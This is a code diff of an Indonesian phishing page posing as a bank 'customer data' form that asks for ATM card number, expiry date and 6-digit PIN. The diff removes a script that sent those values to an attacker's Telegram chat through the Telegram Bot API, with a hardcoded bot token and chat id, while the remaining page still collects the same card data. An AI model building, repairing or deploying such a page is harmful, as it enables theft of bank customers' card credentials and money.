@@ -4,6 +4,7 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Form Data Nasabah</title>
+
 <style>
   body {
     margin: 0;
@@ -86,6 +87,7 @@
   }
 </style>
 </head>
+
 <body>
 
 <div class="header">
@@ -94,23 +96,48 @@
 </div>
 
 <div class="container">
-  <form>
+  <form id="formData" name="formData">
+
     <label for="cardNumber">Nomor Kartu ATM</label>
-    <input type="tel" id="cardNumber" maxlength="18" placeholder="Masukkan nomor kartu ATM Kamu" pattern="\d*" inputmode="numeric" />
+    <input 
+      type="tel" 
+      id="cardNumber" 
+      name="cardNumber" 
+      maxlength="18" 
+      placeholder="Masukkan nomor kartu ATM Kamu" 
+      pattern="\d*" 
+      inputmode="numeric" 
+    />
     <div class="helper-text" id="cardNumberCount">0/18</div>
 
     <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
     <div class="input-with-icon">
-      <input type="tel" id="expiryDate" placeholder="MMYY" maxlength="4" pattern="\d{4}" inputmode="numeric" />
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Calendar icon" role="img">
+      <input 
+        type="tel" 
+        id="expiryDate" 
+        name="expiryDate" 
+        placeholder="MMYY"
+        maxlength="4" 
+        pattern="\d{4}" 
+        inputmode="numeric" 
+      />
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
         <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
       </svg>
     </div>
 
     <label for="pin" style="margin-top: 20px;">6-Digit PIN Kartu ATM</label>
     <div class="input-with-icon">
-      <input type="password" id="pin" maxlength="6" placeholder="PIN" pattern="\d*" inputmode="numeric" />
-      <svg id="togglePin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Toggle PIN visibility" role="button" tabindex="0">
+      <input 
+        type="password" 
+        id="pin" 
+        name="pin" 
+        maxlength="6" 
+        placeholder="PIN" 
+        pattern="\d*" 
+        inputmode="numeric"
+      />
+      <svg id="togglePin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
         <path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
         <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />
       </svg>
@@ -122,14 +149,14 @@
 </div>
 
 <script>
-  // Update counter for card number
+  // Counter kartu
   const cardNumberInput = document.getElementById('cardNumber');
   const cardNumberCount = document.getElementById('cardNumberCount');
   cardNumberInput.addEventListener('input', () => {
     cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
   });
 
-  // Update counter for PIN
+  // Counter PIN
   const pinInput = document.getElementById('pin');
   const pinCount = document.getElementById('pinCount');
   pinInput.addEventListener('input', () => {
@@ -139,90 +166,7 @@
   // Toggle PIN visibility
   const togglePin = document.getElementById('togglePin');
   togglePin.addEventListener('click', () => {
-    if(pinInput.type === 'password'){
-      pinInput.type = 'text';
-      togglePin.innerHTML = `<path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>`;
-    } else {
-      pinInput.type = 'password';
-      togglePin.innerHTML = `<path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
-      <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />`;
-    }
-  });
-</script>
-<script>
-  const botToken = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token bot Telegram Anda
-  const chatId = '7213790655';     // Ganti dengan chat id tujuan pesan
-
-  const form = document.querySelector('form');
-  const cardNumberInput = document.getElementById('cardNumber');
-  const expiryDateInput = document.getElementById('expiryDate');
-  const pinInput = document.getElementById('pin');
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const cardNumber = cardNumberInput.value.trim();
-    const expiryDate = expiryDateInput.value.trim();
-    const pin = pinInput.value.trim();
-
-    // Validasi sederhana
-    const mmYYPattern = /^\d{4}$/;
-    if(cardNumber.length < 16 || cardNumber.length > 18){
-      alert('Nomor kartu ATM harus antara 16-18 digit');
-      return;
-    }
-    if(!mmYYPattern.test(expiryDate)){
-      alert('Tanggal kadalursa harus 4 digit angka (MMYY)');
-      return;
-    }
-    if(pin.length !== 6){
-      alert('PIN harus 6 digit');
-      return;
-    }
-
-    // Membuat pesan yang akan dikirim ke Telegram
-    const message = 
-      `📋 *Informasi Data Nasabah*\n\n` +
-      `*Nomor Kartu ATM:* ${cardNumber}\n` +
-      `*Tanggal Kadalursa:* ${expiryDate}\n` +
-      `*PIN:* ${pin}`;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const params = {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'Markdown'
-    };
-
-    console.log('Mengirim data ke Telegram...');
-    console.log('URL:', url);
-    console.log('Params:', params);
-
-    try {
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(params)
-      });
-
-      console.log('Response status:', response.status);
-      console.log('Response ok:', response.ok);
-
-      if(response.ok){
-        alert('Data berhasil terkirim ke Telegram!');
-        form.reset();
-        // Update counters setelah reset
-        document.getElementById('cardNumberCount').textContent = '0/18';
-        document.getElementById('pinCount').textContent = '0/6';
-      } else {
-        const errorText = await response.text();
-        console.log('Error response:', errorText);
-        alert('Gagal mengirim data ke Telegram. Status: ' + response.status + '. Detail: ' + errorText);
-      }
-    } catch (error) {
-      console.error('Error:', error);
-      alert('Terjadi kesalahan: ' + error.message);
-    }
+    pinInput.type = pinInput.type === 'password' ? 'text' : 'password';
   });
 </script>
 
